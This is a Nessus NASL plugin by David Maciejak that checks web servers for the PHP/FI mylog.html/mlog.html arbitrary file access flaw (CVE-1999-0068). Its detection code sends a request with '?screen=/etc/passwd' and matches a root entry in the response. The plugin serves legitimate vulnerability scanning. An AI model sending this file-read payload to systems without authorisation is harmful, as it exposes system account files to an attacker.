#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref: Bryan Berg on Sun Oct 19 1997.
#
# This script is released under the GNU GPLv2


include("compat.inc");

if(description)
{
 script_id(15708);
 script_version ("$Revision: 1.5 $"); 
 script_cve_id("CVE-1999-0068", "CVE-1999-0346");
 script_bugtraq_id(713);  
 script_xref(name:"OSVDB", value:"3396");
 script_xref(name:"OSVDB", value:"3397");
 
 script_name(english:"PHP < 3.0 mylog.html/mlog.html Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHP/FI.

The remote version of this software contains a flaw in 
the files mylog.html/mlog.html than can allow a remote attacker 
to view arbitrary files on the remote host." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 3.0 or newer" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 summary["english"] = "Checks PHP mylog.html/mlog.html arbitrary file access";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"CGI abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

foreach dir ( make_list(cgi_dirs(), "/php") )
{
	foreach htmlfile (make_list("/mylog.html", "/mlog.html"))
	{
	  req = http_get(port:port, item:dir + htmlfile + "?screen=/etc/passwd");
 	  res = http_keepalive_send_recv(port:port, data:req);
 	  if ( res == NULL ) 
		exit(0);
 	  if ( egrep( pattern:"root:.*:0:[01]:.*", string:res) )
	  {
	 	security_warning(port);
	 	exit(0);
	  }
	 }
}
